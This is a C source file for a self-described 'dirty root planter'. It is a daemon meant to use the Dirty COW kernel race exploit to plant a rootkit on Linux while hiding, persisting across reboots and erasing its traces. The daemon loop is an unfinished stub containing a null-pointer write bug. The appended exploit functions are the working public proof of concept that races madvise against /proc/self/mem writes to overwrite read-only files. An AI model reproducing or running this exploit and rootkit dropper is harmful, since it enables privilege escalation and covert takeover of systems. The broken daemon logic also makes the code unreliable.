/*
################# dirty root planter #######################
This program will produce a daemon that utilizes the dirtyc0w
exploit to plant a rootkit on a target linux system. 

The daemon  works slowly in an effort to stay hidden. 

It is persistent across re-boots until the rootkit is planted.
It then attempts to erase any trace that it was there.

USAGE: $ root-planter


The code that implements the dirtyc0w exploit was taken from
------	dirtycow.ninja 
#############################################################
*/

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>
#include <fcntl.h>


char plantlist[] = 
"usr/bin/file\nusr/bin/otherfile";


pid_t pid;

/*variables for dirtyc0w exploit*/
void *map;
int f;
struct stat st;
char *name;
/*^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^*/

void main(){

/*create a fork from the parent process*/
pid = fork();

if(pid < 0) {
	exit(EXIT_FAILURE);
}

/* set daemon linux permission (this affects all children files as well*/

/*IT IS SET TO GLOBAL RWX PRIVELEGES, BUT MAY WANT TO CHANGE LATER*/

umask(0);

/*we're gonna open some logs */
FILE *axe = fopen("planter.log", "ab+");
	
/*Create an SSID for our daemon*/
int seshun = setsid();

/*if we can't get a session, exit with an error*/
if(seshun < 0) {
	fprintf(axe, ">\nError: A session ID could not be established for the planter daemon\n>\n");
	perror("We done fucked up");
	exit(EXIT_FAILURE);
}

/*we've made a solid session, so let's go to our working directory*/
if ((chdir("/")) < 0) {
	fprintf(axe, "failed to switch to working directory");
}

/*Time to quiet down. Wouldn't want anybody to know we're here*/
close(STDIN_FILENO);
close(STDOUT_FILENO);
close(STDERR_FILENO);

//-----------------------------------------------------------------
//-----------------------------------------------------------------
/*we've finished all of the daemon making, let's get cooking*/


/*look for a checklist, if we don't find one, write a new one*/
FILE *plist = fopen("plantlist","ab+");//THIS MIGHT BE IN A RESTRICTED DIRECTORY xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
if (!plist){
	fprintf(plist, plantlist);
}

int planted = 0;


/*This is the main loop. In here we write, wait, rinse, repeat
until the rootkit is installed*/
while (!planted){
	
	

planted = 1;






}


}





/*dirtyc0w methods (renamed "main" to "plant"*/
//vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
//vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
//vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
//vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
//vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}

void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}


int plant(int argc, char *argv[]){
	
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
